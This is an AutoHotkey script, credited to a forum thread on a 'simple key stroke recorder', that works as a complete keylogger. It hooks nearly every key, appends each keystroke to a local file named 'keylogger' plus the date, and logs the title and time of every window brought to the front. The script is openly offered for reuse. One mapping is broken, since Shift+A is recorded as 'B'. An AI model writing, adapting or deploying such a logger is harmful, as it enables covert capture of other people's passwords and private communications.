;
; AutoHotkey Version: 1.x
; Author: A.N.Other <myemail@nowhere.com>
; Original Forum: http://www.autohotkey.com/board/topic/30294-simple-key-stroke-recorder/
; Script Function:
;    Template script (you can customize this template by editing "ShellNew\Template.ahk" in your Windows folder)
;

/*
Copyright MIT

Permission is hereby granted, free of charge, to any person obtaining
a copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#NoEnv
SendMode Input
SetWorkingDir %A_ScriptDir%


; Below sets the filename. Currently, "keylogger" plus the date in the below format. It also always saves to the same folder as this script. Feel free to adjust the name convention as desired

FormatTime, DateFile, YYYYMMDDHH24MISS, MM-dd-yyyy
filename := % "keylogger" DateFile

; Detect hidden windows since they can be active
; (e.g. AutoHotkey main window while using Menu,MenuName,Show.)
DetectHiddenWindows, On

; First time it is run, it saves the fully formatted time.

FormatTime, TimeString
start := "`n`n ---------------------`n`n Startin at: " . TimeString . "`n`n"

FileAppend,
(
%start%
), %A_ScriptDir%\%filename%.txt

Gui +LastFound
hWnd := WinExist()
DllCall( "RegisterShellHookWindow", UInt,Hwnd )
MsgNum := DllCall( "RegisterWindowMessage", Str,"SHELLHOOK" )
OnMessage( MsgNum, "ShellMessage" )


ShellMessage( wParam,lParam )
{
WinGetTitle, title, ahk_id %lParam%
Sleep, 1000
If (wParam=32772) { ;HSHELL_WINDOWACTIVATED
FormatTime, TimeString, YYYYMMDDHH24MISS, ss:mm:hhtt-MM-dd-yyyy

/* This saves the window and time whenever the window changes. You can adjust the time format the line above, or remove the time altogether by removing %TimeString% below. */

FileAppend,
(
`n Window Title: %Title% %TimeString% `n
), %A_ScriptDir%\%filename%.txt
}
}


~a::fileappend, a, %filename%.txt
~b::fileappend, b, %filename%.txt
~c::fileappend, c, %filename%.txt
~d::fileappend, d, %filename%.txt
~e::fileappend, e, %filename%.txt
~f::fileappend, f, %filename%.txt
~g::fileappend, g, %filename%.txt
~h::fileappend, h, %filename%.txt
~i::fileappend, i, %filename%.txt
~j::fileappend, j, %filename%.txt
~k::fileappend, k, %filename%.txt
~l::fileappend, l, %filename%.txt
~m::fileappend, m, %filename%.txt
~n::fileappend, n, %filename%.txt
~o::fileappend, o, %filename%.txt
~p::fileappend, p, %filename%.txt
~q::fileappend, q, %filename%.txt
~r::fileappend, r, %filename%.txt
~s::fileappend, s, %filename%.txt
~t::fileappend, t, %filename%.txt
~u::fileappend, u, %filename%.txt
~v::fileappend, v, %filename%.txt
~w::fileappend, w, %filename%.txt
~x::fileappend, x, %filename%.txt
~y::fileappend, y, %filename%.txt
~z::fileappend, z, %filename%.txt
~+A::fileappend, B, %filename%.txt
~+B::fileappend, B, %filename%.txt
~+C::fileappend, C, %filename%.txt
~+D::fileappend, D, %filename%.txt
~+E::fileappend, E, %filename%.txt
~+F::fileappend, F, %filename%.txt
~+G::fileappend, G, %filename%.txt
~+H::fileappend, H, %filename%.txt
~+I::fileappend, I, %filename%.txt
~+J::fileappend, J, %filename%.txt
~+K::fileappend, K, %filename%.txt
~+L::fileappend, L, %filename%.txt
~+M::fileappend, M, %filename%.txt
~+N::fileappend, N, %filename%.txt
~+O::fileappend, O, %filename%.txt
~+P::fileappend, P, %filename%.txt
~+Q::fileappend, Q, %filename%.txt
~+R::fileappend, R, %filename%.txt
~+S::fileappend, S, %filename%.txt
~+T::fileappend, T, %filename%.txt
~+U::fileappend, U, %filename%.txt
~+V::fileappend, V, %filename%.txt
~+W::fileappend, W, %filename%.txt
~+X::fileappend, X, %filename%.txt
~+Y::fileappend, Y, %filename%.txt
~+Z::fileappend, Z, %filename%.txt
~`::fileappend, `, %filename%.txt
~!::fileappend, !, %filename%.txt
~@::fileappend, @, %filename%.txt
~#::fileappend, #, %filename%.txt
~$::fileappend, $, %filename%.txt
~^::fileappend, ^, %filename%.txt
~&::fileappend, &, %filename%.txt
~*::fileappend, *, %filename%.txt
~(::fileappend, (, %filename%.txt
~)::fileappend, ), %filename%.txt
~-::fileappend, -, %filename%.txt
~_::fileappend, _, %filename%.txt
~=::fileappend, =, %filename%.txt
~+::fileappend, +, %filename%.txt
~[::fileappend, [, %filename%.txt
~{::fileappend, {, %filename%.txt
~]::fileappend, ], %filename%.txt
~}::fileappend, }, %filename%.txt
~\::fileappend, \, %filename%.txt
~|::fileappend, |, %filename%.txt
~;::fileappend, ;, %filename%.txt
~'::fileappend, ', %filename%.txt
~<::fileappend, <, %filename%.txt
~.::fileappend, ., %filename%.txt
~>::fileappend, >, %filename%.txt
~/::fileappend, /, %filename%.txt
~?::fileappend, ?, %filename%.txt
~enter::fileappend, `n, %filename%.txt
~space::fileappend, %A_Space%, %filename%.txt
~tab::fileappend, {tab}, %filename%.txt
~backspace::fileappend, {Back}, %filename%.txt
~1::fileappend, 1, %filename%.txt
~2::fileappend, 2, %filename%.txt
~3::fileappend, 3, %filename%.txt
~4::fileappend, 4, %filename%.txt
~5::fileappend, 5, %filename%.txt
~6::fileappend, 6, %filename%.txt
~7::fileappend, 7, %filename%.txt
~8::fileappend, 8, %filename%.txt
~9::fileappend, 9, %filename%.txt
~0::fileappend, 0, %filename%.txt